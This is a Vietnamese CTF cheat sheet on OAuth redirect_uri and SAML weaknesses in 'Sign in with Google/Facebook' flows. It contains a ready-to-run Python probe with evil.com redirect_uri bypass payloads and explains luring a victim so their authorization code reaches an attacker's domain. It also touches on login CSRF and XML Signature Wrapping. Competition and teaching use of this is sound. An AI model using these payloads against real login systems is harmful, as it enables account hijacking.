# OAuth / SAML (lỗ hổng trong luồng "Đăng nhập bằng Google/Facebook")

Đây là cơ chế đứng sau nút "Đăng nhập bằng Google/Facebook" hay gặp, hoặc "SSO" (đăng nhập 1 lần dùng chung cho nhiều hệ thống nội bộ công ty). Có nhiều bước chuyển tiếp qua lại giữa trang web bạn đang dùng và nơi xác thực thật (ví dụ Google) — mỗi bước đều có tham số riêng (`redirect_uri` là "gửi kết quả đăng nhập về đâu", `state` là "mã chống giả mạo", `code`/`token` là "bằng chứng đã đăng nhập"). Nếu 1 bước không kiểm tra kỹ (ví dụ `redirect_uri` chấp nhận bất kỳ domain nào thay vì chỉ đúng domain đã đăng ký), bạn có thể cướp được bằng chứng đăng nhập của người khác, hoặc ép người khác vô tình đăng nhập vào tài khoản của chính mình.

Trên Burp bạn nhận ra lỗi này khi: thấy URL chứa `client_id=`, `redirect_uri=`, `response_type=code` (đây là OAuth), hoặc form/URL có `SAMLResponse=` dạng chuỗi base64 (đây là SAML). Thử đổi giá trị `redirect_uri` sang domain khác — nếu hệ thống vẫn chuyển hướng (redirect) kèm mã xác thực mà không báo lỗi "redirect_uri không khớp", nghĩa là việc kiểm tra đang lỏng, có thể khai thác được.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

# Các biến thể redirect_uri hay né được kiểu kiểm tra lỏng (startswith/contains thay vì so khớp chính xác)
REDIRECT_VARIANTS = [
    "https://app.com.evil.com/callback",          # chuỗi BẮT ĐẦU đúng "app.com" nhưng domain thật là evil.com
    "https://app.com%2f@evil.com/callback",       # phần trước @ chỉ là "tên đăng nhập" bị bỏ qua, domain thật là sau @
    "https://app.com/callback/../../../evil",     # path traversal, có thể bị decode khác nhau giữa các bước kiểm tra
]

def solve_one(session, base_url):
    authorize_url = f"{base_url}/authorize"

    for variant in REDIRECT_VARIANTS:
        r = session.get(
            authorize_url,
            params={"client_id": "X", "redirect_uri": variant, "response_type": "code"},
            allow_redirects=False,   # không tự nhảy theo redirect, để mình tự xem header Location
            timeout=5,
        )
        location = r.headers.get("Location", "")
        is_redirect = r.status_code in (301, 302, 303, 307)
        print(variant, "->", r.status_code, location[:100])

        # Nếu server redirect (không báo lỗi) VÀ Location không chứa chữ "error" -> việc kiểm tra đang lỏng
        if is_redirect and "error" not in location.lower():
            print("redirect_uri bị chấp nhận dù không đúng domain thật:", variant)
            # Nếu bài này có flag lộ ngay ở bước này (ví dụ trang callback), kiểm luôn:
            m = FLAG_RE.search(r.text)
            if m:
                return m.group(0)
            return None  # xác nhận lỗ hổng, bước tiếp theo (dụ admin bot bấm link) nằm ngoài phạm vi 1 request

    return None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- `redirect_uri` là nơi nhà cung cấp (provider, ví dụ Google) sẽ gửi "mã xác thực" (`code`) về sau khi người dùng đăng nhập xong — về nguyên tắc, provider PHẢI chỉ chấp nhận đúng domain app đã đăng ký trước, không được chấp nhận domain tuỳ ý.
- 3 biến thể trong `REDIRECT_VARIANTS` đều là domain KHÁC với domain thật của app nhưng "trông giống" theo cách mà 1 kiểm tra viết ẩu (dùng `startswith`/`contains` thay vì so khớp chính xác) có thể bị đánh lừa — ví dụ `"https://app.com.evil.com".startswith("https://app.com")` trả về `True` trong Python, dù domain thật là `evil.com`.
- `allow_redirects=False` để script tự dừng lại xem header `Location` (nơi server định chuyển bạn tới), không tự nhảy theo — vì mình cần SO SÁNH giá trị đó, không cần thực sự đi tới trang kế tiếp.
- Nếu đổi `redirect_uri` thành công (được redirect, không báo lỗi), bước tiếp theo trong thực tế là dụ NẠN NHÂN (không phải chính bạn) bấm vào link authorize đã bị đổi `redirect_uri` này — khi họ đăng nhập thật, mã xác thực của HỌ sẽ bay về domain bạn kiểm soát, bạn dùng mã đó đăng nhập giả làm họ. Đây là lý do phần script chỉ xác nhận lỗ hổng, không tự "chiếm" được tài khoản ai cả nếu không có bước dụ bấm link (giống cách dùng admin bot ở bài XSS).

## Lưu ý nhanh

- Nếu TẤT CẢ biến thể đều bị từ chối — provider đang kiểm tra đúng chuẩn (exact match), không có lỗ hổng loại này; chuyển sang thử tham số `state` (bỏ hẳn tham số này khi gửi callback, xem app có từ chối không — nếu không từ chối, đây là lỗi "login CSRF" có thể khai thác độc lập, không cần domain giả).
- SAML (phần `SAMLResponse=`) đòi hỏi hiểu sâu cấu trúc XML và chữ ký số — không tự viết tay trong lúc thi, dùng Burp extension **SAML Raider** (cài qua BApp Store trước ngày thi, có sẵn 8 kiểu tấn công XML Signature Wrapping chỉ cần 1 click) thay vì tự code.
- WAF hầu như không giúp được ở đây — lỗi nằm ở LOGIC kiểm tra domain/tham số trong code app, không phải ở nội dung request trông "nguy hiểm" theo nghĩa WAF hiểu.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
